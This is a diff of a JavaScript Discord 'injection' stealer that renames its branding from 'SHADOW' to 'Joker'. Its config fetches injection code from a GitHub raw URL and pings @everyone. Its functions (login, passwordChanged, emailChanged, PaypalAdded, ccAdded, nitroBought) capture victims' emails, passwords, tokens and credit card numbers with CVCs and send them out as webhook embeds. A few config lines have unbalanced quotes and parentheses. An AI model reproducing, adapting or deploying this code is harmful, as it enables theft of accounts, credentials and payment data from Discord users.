@@ -11,8 +11,8 @@ const config = {
   auto_buy_nitro: false, 
   ping_on_run: true, 
   ping_val: '@everyone',
-  embed_name: 'SHADOW Injection',
- embed_icon: 'https://cdn.discordapp.com/attachments/1138198116311498785/1148977555421007973/11111.gif'),
+  embed_name: 'Joker Injection',
+ embed_icon: 'https://i.ibb.co/Vpb5mCs/a-89186c405e4e289c1d87e030e1459675.gif'),
   embed_color: 2895667, 
   injection_url: 'https://raw.githubusercontent.com/Hassantk343/injection/main/index.js, 
   /**
@@ -680,7 +680,7 @@ const login = async (email, password, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: '🎉・Discord Injection By SHADOW ・',
+          text: '🎉・Discord Injection By Joker ・',
         },
       },
     ],
@@ -722,7 +722,7 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: '🎉・Discord Injection By SHADOW ・',
+          text: '🎉・Discord Injection By Joker ・',
         },
       },
     ],
@@ -764,7 +764,7 @@ const emailChanged = async (email, password, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: '🎉・Discord Injection By SHADOW・',
+          text: '🎉・Discord Injection By Joker・',
         },
       },
     ],
@@ -806,7 +806,7 @@ const PaypalAdded = async (token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: '🎉・Discord Injection By SHADOW・',
+          text: '🎉・Discord Injection By Joker・',
         },
       },
     ],
@@ -848,7 +848,7 @@ const ccAdded = async (number, cvc, expir_month, expir_year, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: '🎉・Discord Injection By SHADOW',
+          text: '🎉・Discord Injection By Joker',
         },
       },
     ],
@@ -892,7 +892,7 @@ const nitroBought = async (token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: '🎉・Discord Injection By SHADOW',
+          text: '🎉・Discord Injection By Joker',
         },
       },
     ],
